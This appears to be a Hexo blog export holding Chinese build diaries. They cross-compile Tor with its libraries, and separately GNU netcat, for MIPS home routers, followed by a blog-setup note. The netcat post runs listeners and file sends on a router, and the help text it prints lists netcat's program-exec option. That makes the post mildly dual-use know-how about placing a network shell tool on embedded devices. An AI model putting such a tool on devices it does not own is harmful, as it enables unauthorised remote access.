MIPSEL_LINUX_PATH=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin    ##### unset MIPSEL_LINUX_PATH$ export MIPSEL_LINUX_PATH2=/root/Desktop/88/buildroot-2011.05/output/host/usr/bin    ##### unset MIPSEL_LINUX_PATH2</code></pre><p>再次交叉编译 :</p><pre><code>$ ./Configure no-async --prefix=/root/Desktop/cross/yes/openssl2 --cross-compile-prefix=$MIPSEL_LINUX_PATH2/mipsel-linux- linux-mips32</code></pre><p>找错 <code>https://github.com/openssl/openssl/issues/1607</code>  ==&gt; add <code>no-async</code>  # 不加否则错误<br>$ make<br>$ make install<br>ok =&gt; /root/Desktop/cross/yes/openssl2</p><p>到openssl2下面执行/root/Desktop/cross/yes/openssl2/lib<br>$ file libssl.so.1.1</p><pre><code>libssl.so.1.1: ELF 32-bit LSB shared object, MIPS, MIPS32 version 1 (SYSV), dynamically linked, with unknown capability 0xf41 = 0x756e6700, with unknown capability 0x70100 = 0x3040000, not stripped</code></pre><p>ok编译成功</p><p>对了 这边需要很强调一点是 编译哪个版本的buildroot,即使编译buildroot时多选了几个选项,都需要根据Buildroot编译后的bin/下面的文件，进行对<code>openssl</code>再次交叉编译，不然出现 <code>You will probably need to install openssl-devel too.</code></p><hr><h2 id="交叉编译-libevent"><a href="#交叉编译-libevent" class="headerlink" title="交叉编译 libevent"></a>交叉编译 libevent</h2><pre><code>$ ./configure --prefix=/root/Desktop/cross/yes/libevent CC=$MIPSEL_LINUX_PATH2/mipsel-linux-gcc AR=$MIPSEL_LINUX_PATH2/mipsel-linux-ar RANLIB=$MIPSEL_LINUX_PATH2/mipsel-linux-ranlib LD=$MIPSEL_LINUX_PATH2/mipsel-linux-ld STRIP=$MIPSEL_LINUX_PATH2/mipsel-linux-strip --host=mipsel-linux </code></pre><p>错误 </p><pre><code>bufferevent_openssl.c:66:10: fatal error: &#39;openssl/bio.h&#39; file not found</code></pre><p>找错 <code>https://github.com/libevent/libevent/issues/465</code><br>需要配合 <code>openssl</code> 加上 <code>CPPFLAGS</code> and <code>LDFLAGS</code></p><p>再次交叉编译 </p><pre><code>$ ./configure --prefix=/root/Desktop/cross/yes/libevent CC=$MIPSEL_LINUX_PATH2/mipsel-linux-gcc AR=$MIPSEL_LINUX_PATH2/mipsel-linux-ar RANLIB=$MIPSEL_LINUX_PATH2/mipsel-linux-ranlib LD=$MIPSEL_LINUX_PATH2/mipsel-linux-ld STRIP=$MIPSEL_LINUX_PATH2/mipsel-linux-strip --host=mipsel-linux CPPFLAGS=-I/root/Desktop/cross/yes/openssl2/include LDFLAGS=-L/root/Desktop/cross/yes/openssl2/lib</code></pre><p>即:</p><pre><code>$ ./configure --prefix=/root/Desktop/cross/yes/libevent \CC=$MIPSEL_LINUX_PATH2/mipsel-linux-gcc \AR=$MIPSEL_LINUX_PATH2/mipsel-linux-ar \RANLIB=$MIPSEL_LINUX_PATH2/mipsel-linux-ranlib \LD=$MIPSEL_LINUX_PATH2/mipsel-linux-ld \STRIP=$MIPSEL_LINUX_PATH2/mipsel-linux-strip \--host=mipsel-linux \CPPFLAGS=-I/root/Desktop/cross/yes/openssl2/include \LDFLAGS=-L/root/Desktop/cross/yes/openssl2/lib</code></pre><p>警告 </p><pre><code>/root/Desktop/cross/yes/openssl2/lib/libcrypto.so: warning: gethostbyname is obsolescent, use getnameinfo() instead.</code></pre><p>$ make<br>$ make install<br>ok=&gt; /root/Desktop/cross/yes/openssl2</p><p>到libevent下面执行/root/Desktop/cross/yes/libevent/lib<br>$ file libevent-2.1.so.6.0.2</p><pre><code>libevent-2.1.so.6.0.2: ELF 32-bit LSB shared object, MIPS, MIPS32 version 1 (SYSV), dynamically linked, with unknown capability 0xf41 = 0x756e6700, with unknown capability 0x70100 = 0x3040000, not stripped</code></pre><p><code>编译成功</code></p><h2 id="交叉编译-zlib"><a href="#交叉编译-zlib" class="headerlink" title="交叉编译 zlib"></a>交叉编译 zlib</h2><pre><code>$ ./configure --prefix=/root/Desktop/cross/yes/zlib$ CC=$MIPSEL_LINUX_PATH2/mipsel-linux-gcc AR=$MIPSEL_LINUX_PATH2/mipsel-linux-ar RANLIB=$MIPSEL_LINUX_PATH2/mipsel-linux-ranlib</code></pre><p>$ make install<br>到zlib目录/root/Desktop/cross/yes/zlib/lib里面执行<br>$ file libz.so.1.2.11 </p><pre><code>libz.so.1.2.11: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, not stripped</code></pre><p>这根本不是mips属性的,编译错了zlib<br>如果交叉编译成功的话,属性应该是有<code>MIPS32 version</code>。</p><p>重新交叉编译 zlib</p><pre><code>$ CC=$MIPSEL_LINUX_PATH2/mipsel-linux-gcc AR=$MIPSEL_LINUX_PATH2/mipsel-linux-ar RANLIB=$MIPSEL_LINUX_PATH2/mipsel-linux-ranlib ./configure --prefix=/root/Desktop/cross/yes/zlib</code></pre><p>$ make<br>$ make install<br>到zlib目录里面执行/root/Desktop/cross/yes/zlib/lib<br>$ file libz.so.1.2.11 </p><pre><code>libz.so.1.2.11: ELF 32-bit LSB shared object, MIPS, MIPS32 version 1 (SYSV), dynamically linked, with unknown capability 0xf41 = 0x756e6700, with unknown capability 0x70100 = 0x3040000, not stripped</code></pre><p>编译成功</p><hr><h2 id="交叉编译-tor"><a href="#交叉编译-tor" class="headerlink" title="交叉编译 tor"></a>交叉编译 tor</h2><pre><code>$ CC=$MIPSEL_LINUX_PATH2/mipsel-linux-gcc AR=$MIPSEL_LINUX_PATH2/mipsel-linux-ar RANLIB=$MIPSEL_LINUX_PATH2/mipsel-linux-ranlib LD=$MIPSEL_LINUX_PATH2/mipsel-linux-ld STRIP=$MIPSEL_LINUX_PATH2/mipsel-linux-strip ./configure --host=mipsel-linux --disable-tool-name-check --prefix=/root/Desktop/cross/yes/tor --enable-static-libevent --with-libevent-dir=/root/Desktop/cross/yes/libevent --enable-static-openssl --with-openssl-dir=/root/Desktop/cross/yes/openssl2 --enable-static-zlib --with-zlib-dir=/root/Desktop/cross/yes/zlib</code></pre><p><code>or</code></p><pre><code>$  ./configure --host=mipsel-linux --disable-tool-name-check --prefix=/root/Desktop/cross/yes/tor CC=$MIPSEL_LINUX_PATH2/mipsel-linux-gcc AR=$MIPSEL_LINUX_PATH2/mipsel-linux-ar RANLIB=$MIPSEL_LINUX_PATH2/mipsel-linux-ranlib LD=$MIPSEL_LINUX_PATH2/mipsel-linux-ld STRIP=$MIPSEL_LINUX_PATH2/mipsel-linux-strip --enable-static-libevent --with-libevent-dir=/root/Desktop/cross/yes/libevent --enable-static-openssl --with-openssl-dir=/root/Desktop/cross/yes/openssl2 --enable-static-zlib --with-zlib-dir=/root/Desktop/cross/yes/zlib</code></pre><p>即:</p><pre><code>$ CC=$MIPSEL_LINUX_PATH2/mipsel-linux-gcc \AR=$MIPSEL_LINUX_PATH2/mipsel-linux-ar \RANLIB=$MIPSEL_LINUX_PATH2/mipsel-linux-ranlib \LD=$MIPSEL_LINUX_PATH2/mipsel-linux-ld \STRIP=$MIPSEL_LINUX_PATH2/mipsel-linux-strip \./configure --host=mipsel-linux --disable-tool-name-check --prefix=/root/Desktop/cross/yes/tor \--enable-static-libevent --with-libevent-dir=/root/Desktop/cross/yes/libevent \--enable-static-openssl --with-openssl-dir=/root/Desktop/cross/yes/openssl2 \--enable-static-zlib --with-zlib-dir=/root/Desktop/cross/yes/zlib \</code></pre><p>错误 :</p><pre><code>checking for mipsel-linux-gcc... /mipsel-linux-gccchecking whether the C compiler works... noconfigure: error: in `/root/Desktop/9/tor-0.3.1.8&#39;:configure: error: C compiler cannot create executablesSee &#39;config.log&#39; for more details</code></pre><p>检查config.log :<br>发现: </p><pre><code>configure:3752: checking for C compiler versionconfigure:3761: /mipsel-linux-gcc --version &gt;&amp;5./configure: line 3763: /mipsel-linux-gcc: No such file or directoryconfigure:3772: $? = 127</code></pre><p>???? $MIPSEL_LINUX_PATH2 根本就没识别,<br>export 查看所有变量 发现???根本没有$MIPSEL_LINUX_PATH2。 我不是刚才编译zlib的时候才用了吗?<br>再次设置变量 </p><pre><code>export MIPSEL_LINUX_PATH2=/root/Desktop/88/buildroot-2011.05/output/host/usr/bin</code></pre><p>重新交叉编译tor<br>没错误<br>$ make 后错误:</p><pre><code>configure: WARNING: Unable to find liblzma.checking for ZSTD... noconfigure: WARNING: Unable to find libzstdsrc/ext/keccak-tiny/keccak-tiny-unrolled.c: In function &#39;xorin8&#39;:src/ext/keccak-tiny/keccak-tiny-unrolled.c:105: error: &#39;for&#39; loop initial declaration used outside C99 mode</code></pre><p>查看config.log 发现:</p><pre><code>checking for /root/Desktop/88/buildroot-2011.05/output/host/usr/bin/mipsel-linux-gcc option to accept ISO C89... (cached) none neededchecking for /root/Desktop/88/buildroot-2011.05/output/host/usr/bin/mipsel-linux-gcc option to accept ISO C99... unsupported</code></pre><p>gcc版本太低了? 不支持?难道又要重新编译buildroot?</p><p>重新编译buildroot 加上一些选项:<br>choose:</p><pre><code>Target Architecture (MIPS (little endian) or MIPSEL)  ---&gt;Target Architecture Variant (mips 32)  ---&gt;Toolchain type (Buildroot toolchain)  ---&gt; [*] Build/install a shared libgcc?        default)Toolchain type (Buildroot toolchain)  ---&gt; [*] Enable MMU supportToolchain type (Buildroot toolchain)  ---&gt; [*] Use software floatinf point by default Toolchain type (Buildroot toolchain)  ---&gt; [*] Enable large file (files &gt; 2 GB) supportToolchain type (Buildroot toolchain)  ---&gt; -*- Enable WCHAR supportToolchain type (Buildroot toolchain)  ---&gt; [*] Enable toolchain locale/i18n supportToolchain type (Buildroot toolchain)  ---&gt; [*] Enable &#39;program invocation name&#39; supportToolchain type (Buildroot toolchain)  ---&gt; [*] Enable C++ supportToolchain type (Buildroot toolchain)  ---&gt; [*] Enable stack protection supportGCC compiler Version --&gt; gcc 4.6.x</code></pre><p><strong>buildroot choose</strong><br>/img/2011-05-toolchain_choose.png</p><p>设置变量 :</p><pre><code>$ export MIPSEL_LINUX_PATH3=/root/Desktop/888/buildroot-2011.05/output/host/usr/bin</code></pre><pre><code>$ ./configure --host=mipsel-linux --disable-tool-name-check --prefix=/root/Desktop/cross/yes/tor CC=&quot;$MIPSEL_LINUX_PATH3/mipsel-linux-gcc -std=gnu99&quot; AR=$MIPSEL_LINUX_PATH3/mipsel-linux-ar RANLIB=$MIPSEL_LINUX_PATH3/mipsel-linux-ranlib LD=$MIPSEL_LINUX_PATH3/mipsel-linux-ld STRIP=$MIPSEL_LINUX_PATH3/mipsel-linux-strip --enable-static-libevent --with-libevent-dir=/root/Desktop/cross/yes/libevent --enable-static-openssl --with-openssl-dir=/root/Desktop/cross/yes/openssl2 --enable-static-zlib --with-zlib-dir=/root/Desktop/cross/yes/zlib --disable-gcc-hardening</code></pre><p>即:</p><pre><code>./configure --host=mipsel-linux --disable-tool-name-check \--prefix=/root/Desktop/cross/yes/tor \CC=&quot;$MIPSEL_LINUX_PATH3/mipsel-linux-gcc -std=gnu99&quot; \AR=$MIPSEL_LINUX_PATH3/mipsel-linux-ar \RANLIB=$MIPSEL_LINUX_PATH3/mipsel-linux-ranlib \LD=$MIPSEL_LINUX_PATH3/mipsel-linux-ld \STRIP=$MIPSEL_LINUX_PATH3/mipsel-linux-strip \--enable-static-libevent --with-libevent-dir=/root/Desktop/cross/yes/libevent \--enable-static-openssl --with-openssl-dir=/root/Desktop/cross/yes/openssl2 \--enable-static-zlib --with-zlib-dir=/root/Desktop/cross/yes/zlib \--disable-gcc-hardening</code></pre><p>$ make 后报错:</p><pre><code>src/common/compress_lzma.c:22:18: fatal error: lzma.h: No such file or directorycompilation terminated.make[1]: *** [src/common/compress_lzma.o] Error 1</code></pre><p>难道版本问题吗?<br><code>tor-0.2.5.15</code> 版本<br><code>https://dist.torproject.org/tor-0.2.5.15.tar.gz</code><br>make 后错误:</p><pre><code>src/common/aes.c:156:20: error: field &#39;evp&#39; has incomplete typesrc/common/aes.c: In function &#39;evaluate_ctr_for_aes&#39;:src/common/aes.c:259:5: warning: implicit declaration of function &#39;AES_ctr128_encrypt&#39; [-Wimplicit-function-declaration]make[1]: *** [src/common/aes.o] Error 1</code></pre><p>这不是以前遇到的错误,不是缺少什么需要交叉编译的库,而是 每个版本不同导致错误也不同…….</p><p><code>tor-0.2.9.13</code> 版本<br><code>https://dist.torproject.org/tor-0.2.9.13.tar.gz</code></p><pre><code>./configure --host=mipsel-linux --disable-tool-name-check --prefix=/root/Desktop/cross/yes/tor CC=&quot;$MIPSEL_LINUX_PATH3/mipsel-linux-gcc -std=gnu99&quot; AR=$MIPSEL_LINUX_PATH3/mipsel-linux-ar RANLIB=$MIPSEL_LINUX_PATH3/mipsel-linux-ranlib LD=$MIPSEL_LINUX_PATH3/mipsel-linux-ld STRIP=$MIPSEL_LINUX_PATH3/mipsel-linux-strip --enable-static-libevent --with-libevent-dir=/root/Desktop/cross/yes/libevent2 --enable-static-openssl --with-openssl-dir=/root/Desktop/cross/yes/openssl2 --enable-static-zlib --with-zlib-dir=/root/Desktop/cross/yes/zlib2 --disable-gcc-hardening</code></pre><p><strong>./configure</strong><br>/img/configure_tor.png</p><p>make 报警告</p><pre><code>/root/Desktop/9/ttor-0.2.9.13/src/common/compat.c:864: warning: the use of OBSOLESCENT &#39;utime&#39; is discouraged, use `utimes&#39;/root/Desktop/cross/yes/openssl2/lib/libcrypto.a(b_sock.o): In function &#39;BIO_gethostbyname&#39;:b_sock.c:(.text+0x80): warning: gethostbyname is obsolescent, use getnameinfo() instead.</code></pre><p>make install<br>但是！！！！！！！！！！！！！！！！<br>交叉编译成功了<br>$ file tor</p><pre><code>tor: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), dynamically linked (uses shared libs), with unknown capability 0xf41 = 0x756e6700, with unknown capability 0x70100 = 0x3040000, not stripped</code></pre><p><strong>tor</strong><br>/img/file_tor.png</p><p>tor <code>9468 kb</code><br>压缩传到http网盘上去 tor.zip <code>3730 kb</code></p><p><code>http://www98.zippyshare.com/d/tHqb09lT/39660/tor.zip</code><br><code>http://www54.zippyshare.com/d/59vM7raQ/19523/tor.tar.gz</code></p><p>路由器上运行<code>tor</code></p><pre><code>admin@RT-AC66U: unzip tor.zip     =&gt; unzip: invalid zip magic 4F44213Cadmin@RT-AC66U:/tmp/home/root# tar zxvf tor.tar.gz    =&gt; tar: invalid gzip magic</code></pre><p>开个远程机器吧,然后 </p><pre><code>cd /tmp python -m SimpleHTTPServer mv tor /tmpwget http://ip/tor 即可.</code></pre><p><strong>running tor</strong><br>/img/router_tor.png</p><p>之前我怀疑传到路由器上的tor运行时需要某些库文件的,运行发现是不需要的</p><p>但是还是有segmentation fault。<br>还是要用QEMU模拟MIPS测试….</p><p>0x06 qemu模拟mips运行tor</p><p>转到Ubuntu的<br>拷贝buildroot编译成的rootfs.tar（buildroot-2011.05 /output/ images）<br>里面有个lib文件夹，将里面的链接库sudo mv * /lib/</p><p>之后直接运行TOR（qemu的安装后会自动识别MIPS类型的文件）<br>在Ubuntu中运行qemu<br>/img/running_tor_in_ubuntu.png</p><p>QEMU模拟MIPS运行TOR完美运行成功！</p><p>问题来了为什么在路由器上运行失败segmentation fault呢？</p>]]></content>
      
      <categories>
          
          <category> 技术相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 交叉编译 </tag>
            
            <tag> 路由器 </tag>
            
            <tag> tor </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>交叉编译netcat在路由器上使用 - 从入门到放弃再到success</title>
      <link href="/2017/11/27/%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91netcat%E5%9C%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E4%B8%8A%E4%BD%BF%E7%94%A8%20-%20%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E5%86%8D%E5%88%B0success/"/>
      <url>/2017/11/27/%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91netcat%E5%9C%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E4%B8%8A%E4%BD%BF%E7%94%A8%20-%20%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E5%86%8D%E5%88%B0success/</url>
      <content type="html"><![CDATA[<a id="more"></a><p>Author : <a href="https://sp4rr0w.github.io" target="_blank" rel="noopener">https://sp4rr0w.github.io</a><br>Time : 2017-11-27 22:25:51<br>Router Model : RT-N12<br>Router CPU : MIPS32</p><h2 id="1-路由器架构"><a href="#1-路由器架构" class="headerlink" title="1. 路由器架构"></a>1. 路由器架构</h2><pre><code>admin@RT-N12:/tmp/home/rootcat /proc/cpuinfosystem type             : Broadcom BCM53572 chip rev 1 pkg 8processor               : 0cpu model               : MIPS 74K V4.9BogoMIPS                : 149.91wait instruction        : nomicrosecond timers      : yestlb_entries             : 32extra interrupt vector  : nohardware watchpoint     : yesASEs implemented        : mips16 dspshadow register sets    : 1VCED exceptions         : not availableVCEI exceptions         : not availableunaligned_instructions  : 51078121dcache hits             : 2147483648dcache misses           : 0icache hits             : 2147483648icache misses           : 0instructions            : 2147483648</code></pre><h2 id="2-先编译buildroot"><a href="#2-先编译buildroot" class="headerlink" title="2. 先编译buildroot"></a>2. 先编译buildroot</h2><p>可知<code>路由器CPU</code>为 <code>MIPS</code>。由同事告知可以先编译<code>buildroot</code>生成的gcc之后再指定编译<code>netcat</code>，这样可以在路由器上运行。</p><p><code>折腾</code>之路由此开始</p><p>下载buildroot</p><ul><li><a href="https://buildroot.org/downloads/buildroot-2017.08.tar.gz" target="_blank" rel="noopener">https://buildroot.org/downloads/buildroot-2017.08.tar.gz</a></li></ul><!-- more --><p>后编译</p><pre><code>make menuconfig</code></pre><p>出现</p><pre><code>&#39;make menuconfig&#39; requires the ncurses libraries </code></pre><p>Centos 下需要安装</p><pre><code>yum install ncurses-devel -y </code></pre><p>若出现这个</p><pre><code>Your Perl installation is not complete enough; at least the followingmodules are missing:         Data::Dumper         ExtUtils::MakeMaker         Thread::Queue</code></pre><p>解决</p><pre><code>yum install &#39;perl(Data::Dumper)&#39; -y yum install &#39;perl(ExtUtils::MakeMaker)&#39; -y yum install &#39;perl(Thread::Queue)&#39; -y </code></pre><p>运行</p><pre><code>cd buildroot-2017.08make manuconfig </code></pre><p><strong>Buildroot Configuration</strong><br>/img/Buildroot_Configuration.png</p><p><strong>选择 Target options</strong><br>/img/Target_options.png</p><pre><code>Target Architecture        ---&gt;     `MIPS (little endian)` Target Architecture Variant    ---&gt;     `Generic MIPS32 ` `</code></pre><p>make 三十分钟之后ok.<br>猜测<code>MIPS (little endian)</code> ，因为尝试编译了很多次才发现的，血泪教训。而路由器使用<code>MIPS</code>编译buildroot的时候会有很多选择，各自生成的gcc也不同。如下：</p><pre><code>mips64 big endian       mips64 little endianmips64-linux-gcc        mips64el-linux-gccmips big endian         mips little endian    mips-linux-gcc          mipsel-linux-gcc    </code></pre><p>选择mips32 little endian 即会生成mipsel-linux-gcc。</p><p><strong>Toolchian 选择3.2 (里面最低内核版本)</strong><br>/img/Toolchain.png</p><pre><code>Kernel Headers    ---&gt;     `Linux 3.2.x kernel headers`  `</code></pre><p>开始编译</p><pre><code>make</code></pre><p>编译完成结尾显示</p><pre><code>...../usr/bin/install -m 0644 support/misc/target-dir-warning.txt /root/Desktop/6_mipsel_little/buildroot-2017.08/output/target/THIS_IS_NOT_YOUR_ROOT_FILESYSTEM</code></pre><p>编译之后生成</p><pre><code>./buildroot-2017.08/output/host/bin/    ：    mipsel-linux-gcc    mipsel-linux-ranlib     mipsel-linux-ar    mipsel-linux-ld     mipsel-linux-strip and./buildroot-2017.08/output/host/mipsel-buildroot-linux-uclibc/sysroot/lib/  ：    ld-uClibc.so.0 -&gt; ld-uClibc.so.1    ld-uClibc.so.1 -&gt; ld-uClibc-1.0.26.so    ld-uClibc-1.0.26.so    libc.so.0 -&gt; libuClibc-1.0.26.so    libc.so.1 -&gt; libuClibc-1.0.26.so    libuClibc-1.0.26.so</code></pre><h2 id="3-编译netcat"><a href="#3-编译netcat" class="headerlink" title="3. 编译netcat"></a>3. 编译netcat</h2><p>下载netcat</p><pre><code>wget http://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz/download -O netcat-0.7.1.tar.gz</code></pre><p>编译netcat</p><pre><code>cd netcat-0.7.1./configuremake CC=/root/Desktop/buildroot-2017.08/output/host/bin/mips64el-linux-gcc</code></pre><p>不行的话就全部指定</p><pre><code>cd netcat-0.7.1 CC=/root/Desktop/6_mipsel_little/buildroot-2017.08/output/host/bin/mipsel-linux-gcc RANLIB=/root/Desktop/6_mipsel_little/buildroot-2017.08/output/host/bin/mipsel-linux-ranlib AR=/root/Desktop/6_mipsel_little/buildroot-2017.08/output/host/bin/mipsel-linux-ar LD=/root/Desktop/6_mipsel_little/buildroot-2017.08/output/host/bin/mipsel-linux-ld STRIP=/root/Desktop/6_mipsel_little/buildroot-2017.08/output/host/bin/mipsel-linux-strip ./configure --host=mipsel-linuxmake</code></pre><p>编译之后生成</p><pre><code>cd src file ./netcat     ./netcat: ELF 32-bit LSB executable, MIPS, N32 `MIPS64` version 1 (SYSV), dynamically linked (uses shared libs), with unknown capability 0xf41 = 0x756e6700, with unknown capability 0x70100 = 0x3040000, not stripped./netcat     bash: ./netcat: cannot execute binary file</code></pre><p><code>telnet</code>登录路由器，使用wget 下载我的netcat（不可以传到<code>https的网络盘</code>，因为路由上的wget不支持https。例如<code>https://dropfile.to</code>或者其他，一定传http类型网站例如<code>http://s.dropcanvas.com</code>）</p><p>之后发现<code>./netcat</code> 可以运行，但是 ：</p><pre><code>admin@RT-N12:/tmp/home/root# ./netcatCmd Line : -lvvp 5555segmentation faultadmin@RT-N12:/tmp/home/root# ./netcat_mips_little -hGNU netcat 0.7.1, a rewrite of the famous networking tool.Basic usages:connect to somewhere:  ./netcat_mips_little [options] hostname port [port] ...listen for inbound:    ./netcat_mips_little -l -p port [options] [hostname] [port] ...admin@RT-N12:/tmp/home/root# ./netcat_mips_little 192.168.19.113 5555 &lt; 1.txtsegmentation fault</code></pre><p>只有-h参数可用（心中万只草泥马飞奔而过）,不然都是<code>segmentation fault</code></p><p>无法知道错误，大神又告诉我，<code>Qemu</code>可以模拟MIPS运行netcat</p><h2 id="转到Ubuntu"><a href="#转到Ubuntu" class="headerlink" title="转到Ubuntu"></a>转到Ubuntu</h2><pre><code>sudo apt-get install qemu    ==&gt;        /usr/bin/qemu-system-i386        /usr/bin/qemu-mipsel        /usr/bin/qemu*</code></pre><p>出错</p><pre><code>sudo /usr/bin/qemu-mipsel netcat_mipsel_little    =&gt;  /lib/ld-uClibc.so.0: No such file or directory</code></pre><p>解决（<code>ld-uClibc-1.0.26.so</code>在上面已经提到了 在<code>./buildroot-2017.08/output/host/mipsel-buildroot-linux-uclibc/sysroot/lib/</code>里）</p><pre><code>sudo mv ld-uClibc-1.0.26.so /lib/sudo chown -R root:root /lib/ld-uClibc-1.0.26.sosudo ln -s /lib/ld-uClibc-1.0.26.so /lib/ld-uClibc.so.0</code></pre><p>出错</p><pre><code>sudo /usr/bin/qemu-mipsel netcat_mipsel_little    =&gt;  /home/db/Desktop/netcat_mipsel_little: can&#39;t load library &#39;libc.so.0&#39;</code></pre><p>解决</p><pre><code>sudo mv libuClibc-1.0.26.so /lib/            sudo chown -R root:root /lib/libuClibc-1.0.26.sosudo ln -s /lib/libuClibc-1.0.26.so /lib/libc.so.0</code></pre><p>但是但是 运行</p><pre><code>sudo /usr/bin/qemu-mipsel netcat_mipsel_little --helpGNU netcat 0.7.1, a rewrite of the famous networking tool.Basic usages:connect to somewhere:  netcat_mipsel_little [options] hostname port [port] ...listen for inbound:    netcat_mipsel_little -l -p port [options] [hostname] [port] ...tunnel to somewhere:   netcat_mipsel_little -L hostname:port -p port [options]Mandatory arguments to long options are mandatory for short options too.Options:  -c, --close                close connection on EOF from stdin  -e, --exec=PROGRAM         program to exec after connect  -g, --gateway=LIST         source-routing hop point[s], up to 8  -G, --pointer=NUM          source-routing pointer: 4, 8, 12, ...  -h, --help                 display this help and exit  -i, --interval=SECS        delay interval for lines sent, ports scanned  -l, --listen               listen mode, for inbound connects  -L, --tunnel=ADDRESS:PORT  forward local port to remote address.....sudo /usr/bin/qemu-mipsel netcat_mipsel_little -lvvp 555orsudo /usr/bin/qemu-mipsel netcat_mipsel_little 192.168.19.113 5555 &lt; /home/db/Desktop/netcat_mipsel_little    ==&gt;         Unsupported setsockopt level=65535 optname=128        Error: Couldn&#39;t create connection (err=-2): Protocol not available</code></pre><p><code>????????</code>  –help 没问题，其他参数就不行?</p><p><code>然后大神告诉我，可能路由器的Linux内核太低了,处理器mipsel也不支持buildroot编译内核3.2的,我看了一下是2.6.32的，而我编译的buildroot选择Linux内核是3.2，最高可选4.4。妈的 buildroot可选内核都没2.6.32，这让我怎么搞 !</code></p><p><code>Fri 24 Nov 2017 07:19:57 AM EST</code></p><p>周末玩荒野行动PC版两局都是第二，差点吃鸡….气死我了 </p><p>周一再搞 ， 发现<br>….<br><a href="https://buildroot.org/downloads/buildroot-2009.02.tar.gz" target="_blank" rel="noopener">https://buildroot.org/downloads/buildroot-2009.02.tar.gz</a><br>最低 -&gt; Linux 2.6.35.x kernel header -&gt; 无法编译</p><p>但是 ！！！！<br>这个版本</p><pre><code>https://buildroot.org/downloads/buildroot-2012.05.tar.gz</code></pre><p>最低 -&gt; <code>Linux 2.6.35.x kernel header</code> -&gt; <code>编译成功</code><br>编译之后上传路由器 成功监听端口了,其它参数皆可正常使用，不会出现 <code>segmentation fault</code>.<br><a href="http://s.dropcanvas.com/1000000/923000/922746/netcat_2011_05" target="_blank" rel="noopener">http://s.dropcanvas.com/1000000/923000/922746/netcat_2011_05</a></p><p>Nice!!!! </p><p><strong>running netcat</strong><br>/img/router_netcat.png<br>(AC66U and RT-N12 一樣的CPU)</p><p>这里还有个小点，放到Ubuntu的时候 使用qemu-mipsel执行netcat 依旧无法使用，猜测qemu版本问题，<br>我这个是2.5,官网已经2.11了，但是我apt-get install qemu时说此版本是最高了……估计从官网下载编译可以运行的。</p><pre><code># sudo /usr/bin/qemu-mipsel netcat_2011_05 -l -p 555Unsupported setsockopt level=65535 optname=128Error: Couldn&#39;t setup listening socket (err=-2)</code></pre><p>卸载重装qemu</p><pre><code>sudo apt-get remove --auto-remove qemuwget https://download.qemu.org/qemu-2.10.1.tar.xztar xvJf qemu-2.10.1.tar.xzcd qemu-2.10.1./configuremake# cd qemu-2.10.1/mipsel-linux-user# mipsel-linux-user ./qemu-mipsel /home/db/Desktop/netcat_2011_05qemu: uncaught target signal 11 (Segmentation fault) - core dumped[1]    61221 segmentation fault (core dumped)  ./qemu-mipsel /home/db/Desktop/netcat_2011_05....还有错误  不管这个了</code></pre>]]></content>
      
      <categories>
          
          <category> 技术相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 交叉编译 </tag>
            
            <tag> netcat </tag>
            
            <tag> 路由器 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>重新出发</title>
      <link href="/2017/11/26/%E9%87%8D%E6%96%B0%E5%87%BA%E5%8F%91/"/>
      <url>/2017/11/26/%E9%87%8D%E6%96%B0%E5%87%BA%E5%8F%91/</url>
      <content type="html"><![CDATA[<a id="more"></a><p><strong>好久不写博客了，CSDN都1年半没更新啦。</strong></p><blockquote><p><strong>BLOG</strong> </p><ul><li><strong>Github  : <a href="https://github.com/sp4rr0w" target="_blank" rel="noopener">https://github.com/sp4rr0w</a></strong></li><li><strong>CSDN    : <a href="http://blog.csdn.net/clownstar" target="_blank" rel="noopener">http://blog.csdn.net/clownstar</a></strong></li></ul></blockquote><p><strong>博客重启,就在此刻</strong></p>]]></content>
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Blog Install</title>
      <link href="/2017/11/25/Blog%20Install/"/>
      <url>/2017/11/25/Blog%20Install/</url>
      <content type="html"><![CDATA[<a id="more"></a><pre><code>wget http://nodejs.org/dist/v9.2.0/node-v9.2.0-linux-x64.tar.gztar -zxvf node-v9.2.0-linux-x64.tar.gzsudo mv node-v9.2.0-linux-x64 /opt/sudo ln -s /opt/node-v9.2.0-linux-x64/bin/node /usr/local/bin/node        sudo ln -s /opt/node-v9.2.0-linux-x64/bin/npm /usr/local/bin/npmsudo npm install hexo -g /opt/node-v9.2.0-linux-x64/lib/node_modules/hexo/bin/hexo -vsudo ln -s /opt/node-v9.2.0-linux-x64/lib/node_modules/hexo/bin/hexo /usr/local/bin/hexohexo inithexo servercurrent folderhttps://www.jianshu.com/p/53f37196f6e7sudo npm install hexo-deployer-git --savesudo npm install hexo-generator-feed --savesudo npm install hexo-generator-sitemap --savesudo npm install hexo-generator-search --savesudo npm install hexo-front-matter-excerpt --savesudo npm install hexo-git-backup --savesudo npm install shelljs --save_config.yml.deploy:  type: git  repo: git@github.com:Sp4rr0w/sp4rr0w.github.io.git  branch: masterbackup:    type: git    theme: landscape    repository:       github: git@github.com:Sp4rr0w/blog-backup.git,mastergit config --global user.name &quot;sp4rr0w&quot;git config --global user.email &quot;zbxzyzbx@163.com&quot;ssh-keygen -t rsa -C &quot;zbxzyzbx@163.com&quot; ==&gt; id_rsa.pub   profile -&gt; Settings -&gt; SSH and GPG Keys -&gt; Add new SSH keyhexo clean &amp;&amp; hexo g &amp;&amp; hexo dgit clone https://github.com/viosey/hexo-theme-material.git themes/material安装访客量http://ibruce.info/2015/04/04/busuanzi/#more没加载出来前就显示旋转效果 ：打开themes/你的主题/layout/_partial/footer.ejs添加&lt;script async 